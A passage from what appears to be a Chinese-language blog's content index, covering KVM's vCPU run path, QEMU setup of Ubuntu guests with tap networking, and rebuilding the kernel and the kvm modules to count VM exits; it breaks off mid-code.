class=\"line\">\t<span class=\"type\">int</span> r;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (kvm_run-&gt;immediate_exit)</span><br><span class=\"line\">\t\tr = -EINTR;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\tr = vcpu_run(vcpu);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//virt/kvm/kvm_main.c</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">long</span> <span class=\"title function_\">kvm_vcpu_ioctl</span><span class=\"params\">(<span class=\"keyword\">struct</span> file *filp,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t   <span class=\"type\">unsigned</span> <span class=\"type\">int</span> ioctl, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> arg)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (ioctl) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> KVM_RUN: &#123;</span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pid</span> *<span class=\"title\">oldpid</span>;</span></span><br><span class=\"line\">\t\tr = -EINVAL;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (arg)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">\t\toldpid = rcu_access_pointer(vcpu-&gt;pid);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (unlikely(oldpid != current-&gt;pids[PIDTYPE_PID].pid)) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">/* The thread running this VCPU changed. */</span></span><br><span class=\"line\">\t\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pid</span> *<span class=\"title\">newpid</span> =</span> get_task_pid(current, PIDTYPE_PID);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\trcu_assign_pointer(vcpu-&gt;pid, newpid);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (oldpid)</span><br><span class=\"line\">\t\t\t\tsynchronize_rcu();</span><br><span class=\"line\">\t\t\tput_pid(oldpid);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tr = kvm_arch_vcpu_ioctl_run(vcpu, vcpu-&gt;run);</span><br><span class=\"line\">\t\ttrace_kvm_userspace_exit(vcpu-&gt;run-&gt;exit_reason, r);</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">file_operations</span> <span class=\"title\">kvm_vcpu_fops</span> =</span> &#123;</span><br><span class=\"line\">\t.release        = kvm_vcpu_release,</span><br><span class=\"line\">\t.unlocked_ioctl = kvm_vcpu_ioctl,</span><br><span class=\"line\">\t.mmap           = kvm_vcpu_mmap,</span><br><span class=\"line\">\t.llseek\t\t= noop_llseek,</span><br><span class=\"line\">&#125;;  </span><br></pre></td></tr></table></figure>\n\n<p>之后这个错误就一路返回到用户态了，然后挂起vcpu。等待内核管理内存的线程swap in</p>\n","categories":["virtualization"]},{"title":"KVM-Ubuntu","url":"/2024/01/18/virtualization/kvm-ubuntu/","content":"<h1 id=\"KVM-Ubuntu\"><a href=\"#KVM-Ubuntu\" class=\"headerlink\" title=\"KVM-Ubuntu\"></a>KVM-Ubuntu</h1><h2 id=\"hello-world\"><a href=\"#hello-world\" class=\"headerlink\" title=\"hello world\"></a>hello world</h2><p><code>sys_fd = open(&quot;/dev/kvm&quot;)</code></p>\n<p>之后用<code>ioctl(fd,CMD,0)</code>给kvm发送指令</p>\n<p>fd分为kvm的sys_fd，VM的vm_fd和VCPU的vcpu_fd</p>\n<ul>\n<li><p><code>KVM_CREATE_VM</code>：创建VM 拿到VM对应的fd</p>\n</li>\n<li><p><code>KVM_SET_USER_MEMORY_REGION</code>：注册<code>kvm_userspace_memory_region</code>结构体，需要自己设置一个地址(可用mmap)作为VM地址空间的起始位置。这里VMM的一个char数组，对应到VM的整个地址空间</p>\n</li>\n<li><p><code>KVM_CREATE_VCPU</code>：用VM的fd创建VCPU，拿到fd，之后运行VM都是通过vcpu</p>\n<p>需要把拿到的fd通过mmap映射到<code>kvm_run</code>结构体上 方便拿到退出原因 io信息</p>\n</li>\n<li><p><code>KVM_SET_SREGS</code>：设置<code>kvm_sregs</code>结构体，其中包括了cr0 cr3 cr4等系统寄存器，可以自己配置页表，地址用GPA，但是PTE用HVA</p>\n</li>\n<li><p><code>KVM_RUN</code>：运行VM，VM发生exit时这句语句返回</p>\n</li>\n<li><p><code>KVM_GET_REGS</code>：拿寄存器到<code>kvm_regs</code>结构体，可通过<code>.rax</code>访问</p>\n</li>\n</ul>\n<p>输出用<code>outb</code></p>\n<p>配合</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">case</span> KVM_EXIT_IO:</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (vcpu-&gt;kvm_run-&gt;io.direction == KVM_EXIT_IO_OUT</span><br><span class=\"line\">\t\t&amp;&amp; vcpu-&gt;kvm_run-&gt;io.port == <span class=\"number\">0xEA</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"type\">char</span> *p = (<span class=\"type\">char</span> *)vcpu-&gt;kvm_run;</span><br><span class=\"line\">\t\tfwrite(p + vcpu-&gt;kvm_run-&gt;io.data_offset,</span><br><span class=\"line\">\t\tvcpu-&gt;kvm_run-&gt;io.size, <span class=\"number\">1</span>, <span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">\t\tfflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"启动\"><a href=\"#启动\" class=\"headerlink\" title=\"启动\"></a>启动</h2><h3 id=\"core\"><a href=\"#core\" class=\"headerlink\" title=\"core\"></a>core</h3><p><a href=\"https://ubuntu.com/download/kvm\">Install Ubuntu Core on KVM | Ubuntu</a></p>\n<p><code>sudo qemu-system-x86_64 -smp 2 -m 2048 -net nic,model=virtio -net user,hostfwd=tcp::8022-:22,hostfwd=tcp::8090-:80 -nographic -drive file=/usr/share/OVMF/OVMF_CODE.fd,if=pflash,format=raw,unit=0,readonly=on -drive file=ubuntu-core-20-amd64.img,cache=none,format=raw,id=disk1,if=none -device virtio-blk-pci,drive=disk1,bootindex=1 -machine accel=kvm</code></p>\n<p>需要设置<code>-nographic</code>这样启动界面会在执行qemu的shell中被打印 可以输入和按回车选择</p>\n<p>这个官方镜像的启动是需要输入ubuntu账号的，并且需要在ubuntu网站中上传自己的rsa key 然后ssh登录虚拟机的时候需要</p>\n<p>启动qemu的窗口会显示无用的信息 需要另开窗口<code>ssh -p 8022 szy0127@localhost</code>登录虚拟机</p>\n<p>ubuntu官方提供的img镜像apt和dpkg都没有，连安装命令都很困难</p>\n<p>关闭qemu后虚拟机退出，重启后数据都在</p>\n<h3 id=\"cloud\"><a href=\"#cloud\" class=\"headerlink\" title=\"cloud\"></a>cloud</h3><p><a href=\"https://cloudinit.readthedocs.io/en/latest/tutorial/qemu.html\">Core tutorial with QEMU - cloud-init 23.2 documentation (cloudinit.readthedocs.io)</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo qemu-system-x86_64                                            \\</span><br><span class=\"line\">    -net nic                                                    \\</span><br><span class=\"line\">    -net tap,ifname=tap0,script=no,downscript=no\\</span><br><span class=\"line\">    -machine accel=kvm:tcg                                      \\</span><br><span class=\"line\">    -cpu host                                                   \\</span><br><span class=\"line\">    -m 512                                                      \\</span><br><span class=\"line\">    -nographic                                                  \\</span><br><span class=\"line\">    -hda jammy-server-cloudimg-amd64.img                        \\</span><br><span class=\"line\">    -smbios type=1,serial=ds=&#x27;nocloud-net;s=http://192.168.21.220:8000/&#x27;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo qemu-system-x86_64 \\</span><br><span class=\"line\">        -cpu host \\</span><br><span class=\"line\">        --enable-kvm \\</span><br><span class=\"line\">        -smp 1 \\</span><br><span class=\"line\">        -m 1G \\</span><br><span class=\"line\">        -nographic \\</span><br><span class=\"line\">        -device virtio-blk-pci,drive=vdisk \\</span><br><span class=\"line\">        -drive if=none,id=vdisk,file=jammy-server-cloudimg-amd64.img,format=qcow2 \\</span><br><span class=\"line\">        -device virtio-net-pci,netdev=vnet,mac=52:54:00:12:34:88 \\</span><br><span class=\"line\">        -netdev tap,id=vnet,ifname=tap0,script=no,downscript=no \\</span><br><span class=\"line\">        -smbios type=1,serial=ds=&#x27;nocloud-net;s=http://192.168.21.220:8000/&#x27;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>要保证IMDS webserver启动好且网络可达 user模式的<code>10.0.2.2</code> 在net模式不可用</p>\n<p>启动qemu的进程会直接打开虚拟机的shell</p>\n<p>用户名ubuntu 密码password</p>\n<p>关闭qemu后虚拟机退出，重启后数据也都在</p>\n<p>指定编译出的kernel</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo qemu-system-x86_64 \\</span><br><span class=\"line\">    -cpu host \\</span><br><span class=\"line\">    --enable-kvm \\</span><br><span class=\"line\">    -smp 1 \\</span><br><span class=\"line\">    -m 4G \\</span><br><span class=\"line\">    -nographic \\</span><br><span class=\"line\">    -kernel ./bzImage \\</span><br><span class=\"line\">    -append &quot;console=ttyS0 ignore_loglevel root=/dev/vda1&quot; \\</span><br><span class=\"line\">    -device virtio-blk-pci,drive=vdisk \\</span><br><span class=\"line\">    -drive if=none,id=vdisk,file=jammy-server-cloudimg-amd64.img,format=qcow2 \\</span><br><span class=\"line\">    -device virtio-net-pci,netdev=vnet,mac=52:54:00:12:34:88 \\</span><br><span class=\"line\">    -netdev tap,id=vnet,ifname=tap0,script=no,downscript=no \\</span><br><span class=\"line\">    #-smbios type=1,serial=ds=&#x27;nocloud-net;s=http://192.168.21.220:8000/&#x27;</span><br><span class=\"line\">    #-snapshot \\</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"网络\"><a href=\"#网络\" class=\"headerlink\" title=\"网络\"></a>网络</h2><p>ip route add default via 192.168.12.1<br>netplan apply<br>vim &#x2F;etc&#x2F;netplan&#x2F;50-cloud-init.yaml</p>\n<h3 id=\"User\"><a href=\"#User\" class=\"headerlink\" title=\"User\"></a>User</h3><p>user mode可以访问外网 但是ping被ban了</p>\n<p><a href=\"https://blog.csdn.net/m0_43406494/article/details/124827927\">QEMU–用户模式网络_qemu 网络模式_play maker的博客-CSDN博客</a></p>\n<p>host不能访问guest，guest可以访问host</p>\n<h3 id=\"tap-0\"><a href=\"#tap-0\" class=\"headerlink\" title=\"tap 0\"></a>tap 0</h3><p>没有tun模块 要自己编译以后启动</p>\n<p><a href=\"https://www.php1.cn/detail/YuanDaiMaGuanLiG_143ec260.html\">ubuntu下安装tun模块图文详细教程 - 第一PHP社区 (php1.cn)</a></p>\n<p><a href=\"https://blog.csdn.net/larryliuqing/article/details/27127843\">用TAP方式让QEMU虚拟机与host联网_qemu tap0_拉里山姆的博客-CSDN博客</a></p>\n<p>只能虚拟机和主机相互连通 虚拟机无法访问互联网</p>\n<h3 id=\"tap-1\"><a href=\"#tap-1\" class=\"headerlink\" title=\"tap 1\"></a>tap 1</h3><p><a href=\"https://gist.github.com/extremecoders-re/e8fd8a67a515fee0c873dcafc81d811c\">Setting up Qemu with a tap interface (github.com)</a></p>\n<p>虚拟机内部的网卡没有ip 如果输dhclient会卡死  原因是dhclient是跳板机 需要宿主机转发 出于安全考虑被宿主机拦截</p>\n<p>需要在宿主机上执行<code>sudo iptables -P FORWARD ACCEPT</code> 每次重启后需要再次执行</p>\n<p><code>tcpdump -i tap0</code> 看网络包流通情况</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">network:</span><br><span class=\"line\">        sudo brctl addbr br0</span><br><span class=\"line\">        sudo ip addr flush dev ens4</span><br><span class=\"line\">        sudo brctl addif br0 ens4</span><br><span class=\"line\">        sudo tunctl -t tap0 -u ubuntu</span><br><span class=\"line\">        sudo brctl addif br0 tap0</span><br><span class=\"line\">        sudo ifconfig ens4 up</span><br><span class=\"line\">        sudo ifconfig tap0 up</span><br><span class=\"line\">        sudo ifconfig br0 up</span><br><span class=\"line\">        sudo dhclient br0</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>如果没有tunctl</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ip tuntap add dev tap0 mod tap</span><br></pre></td></tr></table></figure>\n\n<p>如果看不见网卡 需要打开guest内核的config_virtio_net m变为y</p>\n<p>进入guest需要sudo dhclient xxx</p>\n<h2 id=\"内核信息\"><a href=\"#内核信息\" class=\"headerlink\" title=\"内核信息\"></a>内核信息</h2><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">szy@broadwell:~$ sudo ls  /sys/kernel/debug/kvm/</span><br><span class=\"line\">136814-12            halt_poll_success_ns  invlpg          max_mmu_page_hash_collisions  mmu_recycled            pf_guest</span><br><span class=\"line\">exits                halt_successful_poll  io_exits        mmio_exits                    mmu_shadow_zapped       remote_tlb_flush</span><br><span class=\"line\">fpu_reload           halt_wakeup           irq_exits       mmu_cache_miss                mmu_unsync              req_event</span><br><span class=\"line\">halt_attempted_poll  host_state_reload     irq_injections  mmu_flooded                   nmi_injections          request_irq</span><br><span class=\"line\">halt_exits           hypercalls            irq_window      mmu_pde_zapped                nmi_window              signal_exits</span><br><span class=\"line\">halt_poll_fail_ns    insn_emulation        l1d_flush       mmu_pte_updated               nx_largepages_splitted  tlb_flush</span><br><span class=\"line\">halt_poll_invalid    insn_emulation_fail   largepages      mmu_pte_write                 pf_fixed</span><br><span class=\"line\">szy@broadwell:~$ sudo ls  /sys/kernel/debug/kvm/136814-12</span><br><span class=\"line\">exits                 halt_successful_poll  io_exits                      mmio_exits       mmu_shadow_zapped       remote_tlb_flush</span><br><span class=\"line\">fpu_reload            halt_wakeup           irq_exits                     mmu_cache_miss   mmu_unsync              req_event</span><br><span class=\"line\">halt_attempted_poll   host_state_reload     irq_injections                mmu_flooded      nmi_injections          request_irq</span><br><span class=\"line\">halt_exits            hypercalls            irq_window                    mmu_pde_zapped   nmi_window              signal_exits</span><br><span class=\"line\">halt_poll_fail_ns     insn_emulation        l1d_flush                     mmu_pte_updated  nx_largepages_splitted  tlb_flush</span><br><span class=\"line\">halt_poll_invalid     insn_emulation_fail   largepages                    mmu_pte_write    pf_fixed                vcpu0</span><br><span class=\"line\">halt_poll_success_ns  invlpg                max_mmu_page_hash_collisions  mmu_recycled     pf_guest                vcpu1</span><br><span class=\"line\">szy@broadwell:~$ sudo cat  /sys/kernel/debug/kvm/136814-12/exits</span><br><span class=\"line\">5449424</span><br></pre></td></tr></table></figure>\n\n<p>文件夹名是qemu的pid</p>\n<h2 id=\"修改内核\"><a href=\"#修改内核\" class=\"headerlink\" title=\"修改内核\"></a>修改内核</h2><h3 id=\"整体编译\"><a href=\"#整体编译\" class=\"headerlink\" title=\"整体编译\"></a>整体编译</h3><p><a href=\"https://kernelnewbies.org/KernelBuild\">KernelBuild - Linux Kernel Newbies</a></p>\n<p><code>make -j8</code> 这里编译完可以拿到bzImage  给qemu的-kernel参数使用 <code>arch/x86/bzImage</code></p>\n<p><code>sudo make modules_install install</code></p>\n<p>选择kernel并重启<code>~/grublist/grub-list.py</code></p>\n<p>broadwell下tmux<code>sudo minicom -D /dev/ttyUSB0</code> 通过串口而不是ssh连bionic 即使内核或网络崩溃无法ssh也可以观察</p>\n<p>升级内核后网络设备有问题 无法访问外网且没有ip   4.15识别到enp15s0 但是需要手动dhclient拿ip 虽然拿到相同的ip，但是只有broadwell可以ping通bionic 跳板机仍然无法ping通</p>\n<p>目前成功修改的路径为<code>/usr/src/linux-source-4.15.0/linux-source-4.15.0</code> grublist显示为<code>Ubuntu, with Linux 4.15.18</code></p>\n<p>修改<code>arch/x86/kernel/paravirt.c#default_banner</code> 可以启动时看到输出 </p>\n<img src=\"C:\\Users\\Shen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230628204908934.png\" alt=\"image-20230628204908934\" style=\"zoom:50%;\" />\n\n<h3 id=\"模块\"><a href=\"#模块\" class=\"headerlink\" title=\"模块\"></a>模块</h3><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> ~ [20:22:54]</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">find /lib/modules/4.15.18/ -name kvm.ko</span></span><br><span class=\"line\">/lib/modules/4.15.18/kernel/arch/x86/kvm/kvm.ko</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> ~ [20:31:58] C:1</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">kvm-ok</span></span><br><span class=\"line\">INFO: /dev/kvm exists</span><br><span class=\"line\">KVM acceleration can be used</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> ~ [20:32:05]</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">sudo rmmod kvm-intel</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> ~ [20:32:12]</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">sudo rmmod kvm</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> ~ [20:32:14]</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">kvm-ok</span></span><br><span class=\"line\">INFO: /dev/kvm does not exist</span><br><span class=\"line\">HINT:   sudo modprobe kvm_intel</span><br><span class=\"line\">INFO: For more detailed results, you should run this as root</span><br><span class=\"line\">HINT:   sudo /usr/sbin/kvm-ok</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> ~ [20:32:18] C:1</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">sudo insmod /lib/modules/4.15.18/kernel/arch/x86/kvm/kvm.ko</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> ~ [20:32:25]</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">sudo insmod /lib/modules/4.15.18/kernel/arch/x86/kvm/kvm-intel.ko</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> ~ [20:32:31]</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">kvm-ok</span></span><br><span class=\"line\">INFO: /dev/kvm exists</span><br><span class=\"line\">KVM acceleration can be used</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> /usr/src/linux-source-4.15.0/linux-source-4.15.0/arch/x86/kvm [21:00:33] C:1</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">sudo insmod /usr/src/linux-source-4.15.0/linux-source-4.15.0/arch/x86/kvm/kvm-intel.ko</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> /usr/src/linux-source-4.15.0/linux-source-4.15.0/arch/x86/kvm [21:00:39]</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">dmesg | <span class=\"built_in\">tail</span> -10</span></span><br><span class=\"line\">[25416.145711] kvm: loading out-of-tree module taints kernel.</span><br><span class=\"line\">[25416.151778] kvm: module verification failed: signature and/or required key missing - tainting kernel</span><br><span class=\"line\">[25435.886621] kvm module modified by szy</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> /usr/src/linux-source-4.15.0/linux-source-4.15.0/arch/x86/kvm [21:00:51] C:1</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">kvm-ok</span></span><br><span class=\"line\">INFO: /dev/kvm exists</span><br><span class=\"line\">KVM acceleration can be used</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight makefile\"><table><tr><td class=\"code\"><pre><span class=\"line\">///usr/src/linux-source-4.15.0/linux-source-4.15.0/arch/x86/kvm/Makefile</span><br><span class=\"line\"><span class=\"section\">update:</span></span><br><span class=\"line\">        sudo make -C /lib/modules/4.15.18/build M=<span class=\"variable\">$(PWD)</span> modules -j10</span><br><span class=\"line\">        sudo rmmod kvm-intel</span><br><span class=\"line\">        sudo rmmod kvm</span><br><span class=\"line\">        sudo insmod <span class=\"variable\">$(PWD)</span>/kvm.ko</span><br><span class=\"line\">        sudo insmod <span class=\"variable\">$(PWD)</span>/kvm-intel.ko</span><br><span class=\"line\">        kvm-ok</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">remove:</span></span><br><span class=\"line\">        sudo rmmod kvm-intel</span><br><span class=\"line\">        sudo rmmod kvm</span><br><span class=\"line\"><span class=\"section\">install:</span></span><br><span class=\"line\">        sudo insmod <span class=\"variable\">$(PWD)</span>/kvm.ko</span><br><span class=\"line\">        sudo insmod <span class=\"variable\">$(PWD)</span>/kvm-intel.ko</span><br><span class=\"line\">        kvm-ok</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"KVM\"><a href=\"#KVM\" class=\"headerlink\" title=\"KVM\"></a>KVM</h2><h3 id=\"调用逻辑\"><a href=\"#调用逻辑\" class=\"headerlink\" title=\"调用逻辑\"></a>调用逻辑</h3><p>用户态qemu通过ioctl发起一次run</p>\n<p><code>kvm_vcpu_ioctl</code>-&gt;<code>kvm_arch_vcpu_ioctl_run</code>-&gt;<code>vcpu_run</code>-&gt;<code>vcpu_enter_guest</code>-&gt;<code>vmx_vcpu_run</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">vcpu_run</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span>&#123;    </span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(;;)&#123;</span><br><span class=\"line\">        r = vcpu_enter_guest(vcpu);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(r&lt;=<span class=\"number\">0</span>)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;\t</span><br></pre></td></tr></table></figure>\n\n<p>如果KVM能处理exit就继续循环 否则回到用户态qemu 由qemu再次调用</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">vcpu_enter_guest</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span>&#123;</span><br><span class=\"line\">    kvm_x86_ops-&gt;run(vcpu);</span><br><span class=\"line\">    ++vcpu-&gt;stat.exits;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> kvm_x86_ops-&gt;handle_exit(vcpu);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在<code>vmx_vcpu_run</code>中由汇编<code>ASM_VMX_VMLAUNCH</code>进入VM执行，VM退出后会紧接着执行下面的几行汇编</p>\n<h3 id=\"exit\"><a href=\"#exit\" class=\"headerlink\" title=\"exit\"></a>exit</h3><p><code>x86.c&gt;vcpu_enter_guest</code>  </p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">++vcpu-&gt;stat.exits;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(vcpu-&gt;stat.exits % <span class=\"number\">1000</span>==<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\tprintk(<span class=\"string\">&quot;vcpu exits:%lld\\n&quot;</span>,vcpu-&gt;stat.exits);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>kvm的函数是需要一个vcpu作为参数的 exit为vcpu的成员变量</p>\n<p>直接在内核改</p>\n<p>vmx.c中增加全局变量，核心函数为<code>vmx_vcpu_run</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">str_values</span> &#123;</span></span><br><span class=\"line\">        <span class=\"type\">int</span>             val;</span><br><span class=\"line\">        <span class=\"type\">const</span> <span class=\"type\">char</span>      *str;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">str_values</span> <span class=\"title\">vmx_exit_reasons</span>[] =</span> &#123;</span><br><span class=\"line\">        VMX_EXIT_REASONS</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">//static int exit_type_num = sizeof(vmx_exit_reasons)/sizeof(struct str_values);</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> exit_counts[<span class=\"number\">65</span>];</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> exit_last_time[<span class=\"number\">65</span>];</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> exit_total_cost_time[<span class=\"number\">65</span>];</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> total_exit_count;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> exit_last_reason=<span class=\"number\">-1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">char</span>* <span class=\"title function_\">get_exit_reason_string</span><span class=\"params\">(<span class=\"type\">int</span> val)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> i;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt;=<span class=\"number\">64</span> ;i++)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(vmx_exit_reasons[i].val == val)&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> vmx_exit_reasons[i].str;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> u64 <span class=\"title function_\">get_timestamp_now</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">timeval</span> <span class=\"title\">tv</span>;</span></span><br><span class=\"line\">        u64 timestamp;</span><br><span class=\"line\">        do_gettimeofday(&amp;tv);</span><br><span class=\"line\">        timestamp = (u64)tv.tv_sec * <span class=\"number\">1000000</span> + tv.tv_usec;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> timestamp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">show_exit_counts</span><span class=\"params\">(<span class=\"type\">int</span> n)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> index[n];</span><br><span class=\"line\">        <span class=\"type\">int</span> i,j;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span> ;i &lt; n ;i++)&#123; <span class=\"comment\">// find ith biggest number</span></span><br><span class=\"line\">                <span class=\"type\">int</span> max = <span class=\"number\">0</span>;</span><br><span class=\"line\">                <span class=\"keyword\">for</span>(j= <span class=\"number\">0</span> ; j&lt;= <span class=\"number\">64</span>; j++)&#123;</span><br><span class=\"line\">                        <span class=\"type\">int</span> k;</span><br><span class=\"line\">                        <span class=\"type\">int</span> duplicated = <span class=\"number\">0</span>;</span><br><span class=\"line\">                        <span class=\"keyword\">for</span>(k = <span class=\"number\">0</span>; k &lt; i ; k++)&#123; <span class=\"comment\">//prevent duplicated</span></span><br><span class=\"line\">                                <span class=\"keyword\">if</span>(index[k] == j)&#123;</span><br><span class=\"line\">                                        duplicated = <span class=\"number\">1</span>;</span><br><span class=\"line\">                                        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                                &#125;</span><br><span 